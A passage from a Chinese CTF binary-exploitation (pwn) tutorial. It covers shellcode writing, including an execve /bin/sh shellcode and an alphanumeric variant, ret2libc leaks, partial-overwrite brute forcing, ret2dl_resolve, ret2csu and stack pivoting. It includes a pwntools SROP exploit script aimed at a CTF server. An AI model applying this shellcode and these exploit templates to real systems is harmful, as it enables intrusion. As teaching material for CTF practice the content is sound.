不能包含&quot;\x00&quot;等等。所以尽可能自己熟悉shellcode的书写。</p><p>一个简单的shellcode例子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// execve(path = &#x27;/bin///sh&#x27;, argv = [&#x27;sh&#x27;], envp = 0)</span></span><br><span class="line">push <span class="number">0x68</span></span><br><span class="line">mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line"><span class="comment">// push argument array [&#x27;sh\x00&#x27;]</span></span><br><span class="line"><span class="comment">// push b&#x27;sh\x00&#x27; </span></span><br><span class="line">push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">xor esi, esi <span class="comment">/* 0 */</span></span><br><span class="line">push rsi <span class="comment">/* null terminate */</span></span><br><span class="line">push <span class="number">8</span></span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi <span class="comment">/* &#x27;sh\x00&#x27; */</span></span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx <span class="comment">/* 0 */</span></span><br><span class="line"><span class="comment">// call execve()</span></span><br><span class="line">push SYS_execve <span class="comment">/* 0x3b */</span></span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>这里获取<code>/bin/sh</code>地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。</p><p>不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即<code>jmp  rax</code>此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。</p><p>同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，<code>mov</code>和<code>syscall</code>都会遭到限制， 可用指令如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>数据传送:</span><br><span class="line">push/pop eax…</span><br><span class="line">pusha/popa</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>算术运算:</span><br><span class="line">inc/dec eax…</span><br><span class="line">sub al, 立即数</span><br><span class="line">sub byte ptr [eax… + 立即数], al dl…</span><br><span class="line">sub byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">sub dword ptr [eax… + 立即数], esi edi</span><br><span class="line">sub word ptr [eax… + 立即数], si di</span><br><span class="line">sub al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">sub ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">sub esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">sub si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>逻辑运算:</span><br><span class="line">and al, 立即数</span><br><span class="line">and dword ptr [eax… + 立即数], esi edi</span><br><span class="line">and word ptr [eax… + 立即数], si di</span><br><span class="line">and ah dh…, byte ptr [ecx edx… + 立即数]</span><br><span class="line">and esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">and si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line">xor al, 立即数</span><br><span class="line">xor byte ptr [eax… + 立即数], al dl…</span><br><span class="line">xor byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">xor dword ptr [eax… + 立即数], esi edi</span><br><span class="line">xor word ptr [eax… + 立即数], si di</span><br><span class="line">xor al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">xor ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">xor esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">xor si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>比较指令:</span><br><span class="line">cmp al, 立即数</span><br><span class="line">cmp byte ptr [eax… + 立即数], al dl…</span><br><span class="line">cmp byte ptr [eax… + 立即数], ah dh…</span><br><span class="line">cmp dword ptr [eax… + 立即数], esi edi</span><br><span class="line">cmp word ptr [eax… + 立即数], si di</span><br><span class="line">cmp al dl…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp ah dh…, byte ptr [eax… + 立即数]</span><br><span class="line">cmp esi edi, dword ptr [eax… + 立即数]</span><br><span class="line">cmp si di, word ptr [eax… + 立即数]</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>转移指令:</span><br><span class="line">push <span class="number">56</span>h</span><br><span class="line">pop eax</span><br><span class="line">cmp al, <span class="number">43</span>h</span><br><span class="line">jnz lable</span><br><span class="line"></span><br><span class="line">&lt;=&gt; jmp lable</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>交换al, ah</span><br><span class="line">push eax</span><br><span class="line">xor ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line">xor byte ptr [esp], ah <span class="comment">// al ^= ah</span></span><br><span class="line">xor ah, byte ptr [esp] <span class="comment">// ah ^= al</span></span><br><span class="line">pop eax</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>清零:</span><br><span class="line">push <span class="number">44</span>h</span><br><span class="line">pop eax</span><br><span class="line">sub al, <span class="number">44</span>h ; eax = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">push esi</span><br><span class="line">push esp</span><br><span class="line">pop eax</span><br><span class="line">xor [eax], esi ; esi = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>一般而言,  我们采用<code>xor</code>或者<code>sub</code>指令修改shellcode后面的值，构造<code>0f 05</code>， 实现syscall。</p><p>一个例子(纯字母数字shellcode):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129</span></span><br><span class="line"><span class="comment">/* from call rax */</span></span><br><span class="line">push rax</span><br><span class="line">push rax</span><br><span class="line">pop rcx</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XOR pop rsi, pop rdi, syscall */</span></span><br><span class="line">push <span class="number">0x41413030</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x30</span>], eax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* XOR /bin/sh */</span></span><br><span class="line">push <span class="number">0x34303041</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x34</span>], eax</span><br><span class="line">push <span class="number">0x41303041</span></span><br><span class="line">pop rax</span><br><span class="line">xor DWORD PTR [rcx+<span class="number">0x38</span>], eax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rdi = &amp;&#x27;/bin/sh&#x27; */</span></span><br><span class="line">push rcx</span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x34</span></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rdx = 0 */</span></span><br><span class="line">push <span class="number">0x30</span></span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x30</span></span><br><span class="line">push rax</span><br><span class="line">pop rdx</span><br><span class="line"></span><br><span class="line">push rax</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rax = 59 (SYS_execve) */</span></span><br><span class="line">push <span class="number">0x41</span></span><br><span class="line">pop rax</span><br><span class="line">xor al, <span class="number">0x7a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop rsi, pop rdi*/</span></span><br><span class="line"><span class="comment">/* syscall */</span> </span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x6f</span></span><br><span class="line">.byte <span class="number">0x4e</span></span><br><span class="line">.byte <span class="number">0x44</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* /bin/sh */</span></span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x52</span></span><br><span class="line">.byte <span class="number">0x59</span></span><br><span class="line">.byte <span class="number">0x5a</span></span><br><span class="line">.byte <span class="number">0x6e</span></span><br><span class="line">.byte <span class="number">0x43</span></span><br><span class="line">.byte <span class="number">0x5a</span></span><br><span class="line">.byte <span class="number">0x41</span></span><br></pre></td></tr></table></figure><p>构造尽可能短的shellcode可能用到的一些指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cdp  </span><br><span class="line">%The CDQ instruction copies the sign (bit 31) </span><br><span class="line">%of the value in the EAX register into every bit </span><br><span class="line">%position in the EDX register. </span><br></pre></td></tr></table></figure><h4 id="shellcode生成工具">shellcode生成工具</h4><p>同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。</p><h4 id="mprotect">mprotect()</h4><p>进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。</p><p>这个函数可以修改指定内存段的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mprotect:</span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr 内存起始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限，7为可读可写可执行</span><br></pre></td></tr></table></figure><p>如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode</p><h3 id="ret2libc">ret2libc</h3><h4 id="leak-libc">leak_libc</h4><p>对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.</p><p>目前而言，我遇到的栈题中leak_libc，有两种方法：</p><ol><li>partial_overwrite<br>有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。</li><li>通过puts，write等函数，打印<code>.got</code>，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ref:  https://github.com/lieanu/LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>另一个可以本地部署的实用工具是libc-database</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ./find <span class="built_in">printf</span> 260 puts f30</span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br><span class="line">$ ./dump libc6_2.19-0ubuntu6.6_i386</span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br><span class="line">$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br></pre></td></tr></table></figure><h4 id="partial-overwrite">partial_overwrite</h4><h5 id="前置知识">前置知识</h5><p>针对没有泄露的赛题，可以考虑partial_overwrite改写<code>got</code>表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。</p><p>考虑对于一个<code>got</code>表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖<code>got</code>为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall</p><h5 id="爆破脚本写法">爆破脚本写法</h5><p>一个爆破脚本模板:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">elf =<span class="string">&#x27;./ciscn_s_3&#x27;</span></span><br><span class="line">remote_add = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">remote_port = <span class="number">29554</span></span><br><span class="line"></span><br><span class="line">main_add = <span class="number">0x40051d</span></span><br><span class="line">off = <span class="number">0x130</span></span><br><span class="line">system_add = <span class="number">0x400517</span></span><br><span class="line">rtframe = <span class="number">0x4004da</span></span><br><span class="line">ret_add = <span class="number">0x4004e9</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">20</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            p = remote(remote_add, remote_port, timeout = <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            p = gdb.debug(elf)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(elf, timeout = <span class="number">1</span>)</span><br><span class="line">        payload1 = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + cyclic(<span class="number">0x8</span>)</span><br><span class="line">        payload1+= p64(main_add)</span><br><span class="line"></span><br><span class="line">        p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">        stack_add = u64(p.recv(<span class="number">0x28</span>)[-<span class="number">8</span>::]) - off</span><br><span class="line"></span><br><span class="line">        frame = SigreturnFrame()</span><br><span class="line">        frame.rax = <span class="number">0x3b</span></span><br><span class="line">        frame.rdi = stack_add</span><br><span class="line">        frame.rsi = <span class="number">0</span></span><br><span class="line">        frame.rdx = <span class="number">0</span></span><br><span class="line">        frame.rsp = stack_add</span><br><span class="line">        frame.rip = system_add</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + cyclic(<span class="number">0x8</span>)</span><br><span class="line">        payload+= p64(rtframe)</span><br><span class="line">        payload+= p64(system_add)</span><br><span class="line">        payload+= <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#p.sendline(&#x27;a&#x27;)</span></span><br><span class="line">        <span class="comment">#p.recvuntil(&#x27;\0&#x27;)</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recvline())</span><br><span class="line">        </span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">    off+=<span class="number">0x8</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>核心模板:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    try:</span><br><span class="line"><span class="comment">// p = process()</span></span><br><span class="line"><span class="comment">// pass</span></span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        print(p.recvline())</span><br><span class="line">        p.close()</span><br><span class="line">    except BaseException as e:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="comment">// pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>采用grep 获取输出包含flag的行就行</p><h4 id="ret2dl-resolve">ret2dl_resolve()</h4><p>延迟绑定会使用_dl_resolve()函数</p><ul><li><p>_dl_resolve中</p><p>_dl_resolve调用_dl_fixup, _dl_dixup流程：</p><ol><li>通过link_map 获得.dynsym、.dynstr、.rel.plt地址</li><li>通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针</li><li>通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针</li><li>检查r_info</li><li>检查&amp;(Elf64_Sym)-&gt;st_other</li><li>通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数</li></ol></li></ul><p>综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)</p><table><thead><tr><th style="text-align:left"></th><th style="text-align:left">修改 dynamic 节的内容</th><th style="text-align:left">修改重定位表项的位置</th><th style="text-align:left">伪造 linkmap</th></tr></thead><tbody><tr><td style="text-align:left">主要前提要求</td><td style="text-align:left">无</td><td style="text-align:left">无</td><td style="text-align:left">无信息泄漏时需要 libc</td></tr><tr><td style="text-align:left">适用情况</td><td style="text-align:left">NO RELRO</td><td style="text-align:left">NO RELRO, Partial RELRO</td><td style="text-align:left">NO RELRO, Partial RELRO</td></tr><tr><td style="text-align:left">注意点</td><td style="text-align:left"></td><td style="text-align:left">确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td><td style="text-align:left">确保重定位位置可写；需要着重伪造重定位表项、符号表；</td></tr></tbody></table><h3 id="Tricks">Tricks</h3><h4 id="ret2csu">ret2csu</h4><p>csu主要是为了控制rdx，一般如果gadget较少， 可能没有直接rdx，<br>一个典型的csu如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400940</span> loc_400940:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400940</span>                 mov     rdx, r15</span><br><span class="line">.text:<span class="number">0000000000400943</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400946</span>                 mov     edi, r13d</span><br><span class="line">.text:<span class="number">0000000000400949</span>                 call    ds:(__frame_dummy_init_array_entry - <span class="number">600</span>D90h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040094</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400951</span>                 cmp     rbp, rbx</span><br><span class="line">.text:<span class="number">0000000000400954</span>                 jnz     <span class="type">short</span> loc_400940</span><br><span class="line">.text:<span class="number">0000000000400956</span></span><br><span class="line">.text:<span class="number">0000000000400956</span> loc_400956:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400956</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040095</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040095B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040095</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040095</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400960</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400962</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400964</span>                 retn</span><br></pre></td></tr></table></figure><p>那么通过0x400956和0x400940的组合，就可以控制rdx 了。<br>将r12+rbx*8 控制为一个无效got表项，并且令rbx比rbp大1，就可以循环劫持控制流了。</p><h4 id="stack-pivoting">stack pivoting</h4><p>栈迁移技巧， 主要针对可溢出字节较少的情况，通过<code>leave</code>此类指令控制rsp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;leave 相当于:</span><br><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">;那么考虑将栈帧中rbp地址改为栈迁移目的地址</span><br><span class="line">;leave两次之后，就可以将栈转移到目的地址</span><br><span class="line">;同时要现在目的地址布置好fake_stack</span><br></pre></td></tr></table></figure><p>可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数</p><p>不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:</p><ul><li>在第一次read读入后将rbp改为要写入的位置</li><li>ret到read</li><li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li><li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li></ul><h5 id="example">example</h5><p>一个程序反汇编后:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You can use stackoverflow.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But only overflow a bit more...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And you must print first.&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">0x30</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串</p><p>但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行</p><p><s>虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误</s></p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 